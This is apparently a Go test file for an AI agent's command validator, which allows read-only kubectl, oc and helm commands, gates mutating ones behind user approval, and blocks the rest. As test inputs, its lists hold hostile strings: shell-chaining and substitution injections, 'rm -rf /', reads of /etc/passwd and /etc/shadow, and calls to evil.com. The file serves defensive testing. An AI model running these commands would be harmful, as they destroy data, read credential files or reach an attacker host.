package agent

import "testing"

func TestValidateMixedModeCommandsBatch(t *testing.T) {
	tests := []struct {
		name            string
		commands        []string
		wantApproved    int
		wantRejected    int
		wantAllApproval bool // all rejected items require approval (not hard-blocked)
	}{
		{
			name:         "empty list",
			commands:     []string{},
			wantApproved: 0,
			wantRejected: 0,
		},
		{
			name:         "whitespace-only entries skipped",
			commands:     []string{"", "   ", "\t"},
			wantApproved: 0,
			wantRejected: 0,
		},
		{
			name:         "read-only kubectl allowed",
			commands:     []string{"kubectl get pods", "kubectl describe pod foo"},
			wantApproved: 2,
			wantRejected: 0,
		},
		{
			name:         "read-only helm allowed",
			commands:     []string{"helm list", "helm status release1"},
			wantApproved: 2,
			wantRejected: 0,
		},
		{
			name:            "mutating kubectl needs approval",
			commands:        []string{"kubectl apply -f deploy.yaml"},
			wantApproved:    0,
			wantRejected:    1,
			wantAllApproval: true,
		},
		{
			name:         "disallowed command blocked",
			commands:     []string{"curl http://example.com"},
			wantApproved: 0,
			wantRejected: 1,
		},
		{
			name:         "shell chaining blocked",
			commands:     []string{"kubectl get pods; rm -rf /"},
			wantApproved: 0,
			wantRejected: 1,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := validateMixedModeCommands(tt.commands)
			if len(result.Approved) != tt.wantApproved {
				t.Errorf("approved count = %d, want %d; approved: %v", len(result.Approved), tt.wantApproved, result.Approved)
			}
			if len(result.Rejected) != tt.wantRejected {
				t.Errorf("rejected count = %d, want %d; rejected: %v", len(result.Rejected), tt.wantRejected, result.Rejected)
			}
			if tt.wantAllApproval {
				for _, r := range result.Rejected {
					if !r.RequiresApproval {
						t.Errorf("expected RequiresApproval for %q, got hard-block: %s", r.Command, r.Reason)
					}
				}
			}
		})
	}
}

func TestValidateMixedModeCommand_ShellInjection(t *testing.T) {
	injections := []string{
		"kubectl get pods; cat /etc/passwd",
		"kubectl get pods | grep running",
		"kubectl get pods & bg",
		"kubectl get pods < /etc/passwd",
		"kubectl get pods > /tmp/out",
		"kubectl get pods `whoami`",
		"kubectl get pods $HOME",
		"kubectl get pods $(id)",
	}

	for _, cmd := range injections {
		t.Run(cmd, func(t *testing.T) {
			requiresApproval, reason := validateMixedModeCommand(cmd)
			if reason == "" {
				t.Fatalf("expected shell injection to be blocked: %q", cmd)
			}
			if requiresApproval {
				t.Fatalf("shell injection should be hard-blocked, not approval-required: %q", cmd)
			}
		})
	}
}

func TestValidateMixedModeCommand_TransportOverrides(t *testing.T) {
	overrides := []string{
		"kubectl --kubeconfig=/etc/k8s get pods",
		"kubectl --context=prod get pods",
		"kubectl --token=abc123 get pods",
		"kubectl --server=http://evil.com get pods",
		"kubectl --as=admin get pods",
		"kubectl --client-certificate=/tmp/cert get pods",
		"kubectl --insecure-skip-tls-verify get pods",
	}

	for _, cmd := range overrides {
		t.Run(cmd, func(t *testing.T) {
			_, reason := validateMixedModeCommand(cmd)
			if reason == "" {
				t.Fatalf("expected transport override to be blocked: %q", cmd)
			}
		})
	}
}

func TestValidateMixedModeCommand_StreamingFlags(t *testing.T) {
	streaming := []string{
		"kubectl logs pod-1 --follow",
		"kubectl get pods --watch",
		"kubectl logs pod-1 -f",
		"kubectl get pods -w",
	}

	for _, cmd := range streaming {
		t.Run(cmd, func(t *testing.T) {
			_, reason := validateMixedModeCommand(cmd)
			if reason == "" {
				t.Fatalf("expected streaming flag to be blocked: %q", cmd)
			}
		})
	}
}

func TestValidateMixedModeCommand_KubectlApprovalRequired(t *testing.T) {
	commands := []struct {
		cmd  string
		want bool // true = requires approval
	}{
		{"kubectl get pods", false},
		{"kubectl get namespaces", false},
		{"kubectl describe node worker-1", false},
		{"kubectl apply -f deploy.yaml", true},
		{"kubectl delete pod foo", true},
		{"kubectl scale deployment web --replicas=3", true},
		{"kubectl exec pod-1 -- ls", true},
		{"kubectl create namespace test", true},
		{"kubectl rollback deployment/web", true},
	}

	for _, tt := range commands {
		t.Run(tt.cmd, func(t *testing.T) {
			requiresApproval, reason := validateMixedModeCommand(tt.cmd)
			if tt.want {
				if reason == "" {
					t.Fatalf("expected command to need approval: %q", tt.cmd)
				}
				if !requiresApproval {
					t.Fatalf("expected RequiresApproval=true for %q, got hard-block: %s", tt.cmd, reason)
				}
			} else {
				if reason != "" {
					t.Fatalf("expected command to be allowed, got rejection: %q reason=%s", tt.cmd, reason)
				}
			}
		})
	}
}

func TestValidateMixedModeCommand_HelmVerbs(t *testing.T) {
	tests := []struct {
		cmd          string
		wantBlocked  bool
		wantApproval bool
	}{
		{"helm list", false, false},
		{"helm status myrelease", false, false},
		{"helm version", false, false},
		{"helm history myrelease", false, false},
		{"helm install myrelease chart/", true, true},
		{"helm upgrade myrelease chart/", true, true},
		{"helm uninstall myrelease", true, true},
		{"helm rollback myrelease 1", true, true},
		{"helm repo add bitnami https://charts.bitnami.com", true, true},
		{"helm badverb", true, false},
	}

	for _, tt := range tests {
		t.Run(tt.cmd, func(t *testing.T) {
			requiresApproval, reason := validateMixedModeCommand(tt.cmd)
			blocked := reason != ""
			if blocked != tt.wantBlocked {
				t.Fatalf("blocked=%v want=%v for %q (reason=%s)", blocked, tt.wantBlocked, tt.cmd, reason)
			}
			if tt.wantBlocked && requiresApproval != tt.wantApproval {
				t.Fatalf("requiresApproval=%v want=%v for %q", requiresApproval, tt.wantApproval, tt.cmd)
			}
		})
	}
}

func TestValidateMixedModeCommand_SensitiveResources(t *testing.T) {
	tests := []struct {
		cmd          string
		wantApproval bool
	}{
		{"kubectl get secrets", true},
		{"kubectl get secret my-secret", true},
		{"kubectl describe secret my-secret", true},
		{"kubectl get pods", false},
		{"kubectl get deployments", false},
	}

	for _, tt := range tests {
		t.Run(tt.cmd, func(t *testing.T) {
			requiresApproval, reason := validateMixedModeCommand(tt.cmd)
			if tt.wantApproval {
				if reason == "" || !requiresApproval {
					t.Fatalf("expected approval-required for %q, got reason=%q approval=%v", tt.cmd, reason, requiresApproval)
				}
			} else {
				if requiresApproval {
					t.Fatalf("unexpected approval-required for %q: %s", tt.cmd, reason)
				}
			}
		})
	}
}

func TestValidateMixedModeCommand_SensitiveOutputFormats(t *testing.T) {
	tests := []struct {
		cmd          string
		wantApproval bool
	}{
		{"kubectl get pods -o json", true},
		{"kubectl get pods -o yaml", true},
		{"kubectl get pods --output=jsonpath={.items}", true},
		{"kubectl get pods -o wide", false},
		{"kubectl get pods -o name", false},
		{"kubectl get pods", false},
	}

	for _, tt := range tests {
		t.Run(tt.cmd, func(t *testing.T) {
			requiresApproval, reason := validateMixedModeCommand(tt.cmd)
			if tt.wantApproval {
				if !requiresApproval {
					t.Fatalf("expected approval for output format in %q, got reason=%q approval=%v", tt.cmd, reason, requiresApproval)
				}
			}
		})
	}
}

func TestValidateMixedModeCommand_PathTraversal(t *testing.T) {
	traversals := []string{
		"kubectl cp pod-1:../../../etc/passwd /tmp/out",
		"kubectl exec pod-1 -- cat ../../etc/shadow",
	}

	for _, cmd := range traversals {
		t.Run(cmd, func(t *testing.T) {
			requiresApproval, reason := validateMixedModeCommand(cmd)
			if reason == "" {
				t.Fatalf("expected path traversal to be blocked: %q", cmd)
			}
			if requiresApproval {
				t.Fatalf("path traversal should be hard-blocked: %q", cmd)
			}
		})
	}
}

func TestValidateMixedModeCommand_DataFlags(t *testing.T) {
	blocked := []string{
		"kubectl get pods --filename=/etc/passwd",
		"kubectl get pods --raw /api/v1/pods",
		"kubectl get pods -f evil.yaml",
	}

	for _, cmd := range blocked {
		t.Run(cmd, func(t *testing.T) {
			_, reason := validateMixedModeCommand(cmd)
			if reason == "" {
				t.Fatalf("expected data flag to be blocked: %q", cmd)
			}
		})
	}
}

func TestValidateMixedModeCommand_OnlyAllowedBinaries(t *testing.T) {
	disallowed := []string{
		"curl http://example.com",
		"wget http://evil.com",
		"bash -c 'rm -rf /'",
		"python3 -c 'import os; os.system(\"id\")'",
		"cat /etc/passwd",
		"ls -la /",
	}

	for _, cmd := range disallowed {
		t.Run(cmd, func(t *testing.T) {
			requiresApproval, reason := validateMixedModeCommand(cmd)
			if reason == "" {
				t.Fatalf("expected non-allowlisted command to be blocked: %q", cmd)
			}
			if requiresApproval {
				t.Fatalf("non-allowlisted commands should be hard-blocked: %q", cmd)
			}
		})
	}
}

func TestValidateMixedModeCommand_ConfigSubcommands(t *testing.T) {
	tests := []struct {
		cmd     string
		allowed bool
	}{
		{"kubectl config view", true},
		{"kubectl config current-context", true},
		{"kubectl config get-contexts", true},
		{"kubectl config set-context prod", false},
		{"kubectl config use-context staging", false},
		{"kubectl config set current-context other", false},
	}

	for _, tt := range tests {
		t.Run(tt.cmd, func(t *testing.T) {
			_, reason := validateMixedModeCommand(tt.cmd)
			if tt.allowed && reason != "" {
				t.Fatalf("expected config subcommand to be allowed: %q, got reason=%s", tt.cmd, reason)
			}
			if !tt.allowed && reason == "" {
				t.Fatalf("expected config mutation to be blocked: %q", tt.cmd)
			}
		})
	}
}

func TestValidateMixedModeCommand_OcAlias(t *testing.T) {
	tests := []struct {
		cmd     string
		blocked bool
	}{
		{"oc get pods", false},
		{"oc describe node worker-1", false},
		{"oc apply -f deploy.yaml", true},
		{"oc --kubeconfig=/tmp/k get pods", true},
	}

	for _, tt := range tests {
		t.Run(tt.cmd, func(t *testing.T) {
			_, reason := validateMixedModeCommand(tt.cmd)
			blocked := reason != ""
			if blocked != tt.blocked {
				t.Fatalf("oc command blocked=%v want=%v for %q (reason=%s)", blocked, tt.blocked, tt.cmd, reason)
			}
		})
	}
}

func TestFormatMixedModeRejectedCommands(t *testing.T) {
	t.Run("empty list returns empty string", func(t *testing.T) {
		result := formatMixedModeRejectedCommands(nil)
		if result != "" {
			t.Fatalf("expected empty string for nil input, got %q", result)
		}
		result = formatMixedModeRejectedCommands([]mixedModeRejectedCommand{})
		if result != "" {
			t.Fatalf("expected empty string for empty input, got %q", result)
		}
	})

	t.Run("formats blocked commands", func(t *testing.T) {
		rejected := []mixedModeRejectedCommand{
			{Command: "curl http://evil.com", Reason: "only kubectl, oc, and helm commands are allowed", RequiresApproval: false},
			{Command: "kubectl apply -f x.yaml", Reason: "kubectl apply requires explicit user approval", RequiresApproval: true},
		}
		result := formatMixedModeRejectedCommands(rejected)
		if result == "" {
			t.Fatal("expected non-empty formatted output")
		}
		if len(result) < 50 {
			t.Fatalf("formatted output suspiciously short: %q", result)
		}
	})
}

func TestFirstMixedModePositionalArg(t *testing.T) {
	tests := []struct {
		args []string
		want string
	}{
		{[]string{"get", "pods"}, "get"},
		{[]string{"-n", "kube-system", "get", "pods"}, "get"},
		{[]string{"--namespace", "default", "describe", "pod"}, "describe"},
		{[]string{"--output=json", "get"}, "get"},
		{[]string{"-o", "wide", "logs"}, "logs"},
		{[]string{}, ""},
		{[]string{"-n", "default"}, ""},
	}

	for _, tt := range tests {
		t.Run("", func(t *testing.T) {
			got := firstMixedModePositionalArg(tt.args)
			if got != tt.want {
				t.Errorf("firstMixedModePositionalArg(%v) = %q, want %q", tt.args, got, tt.want)
			}
		})
	}
}
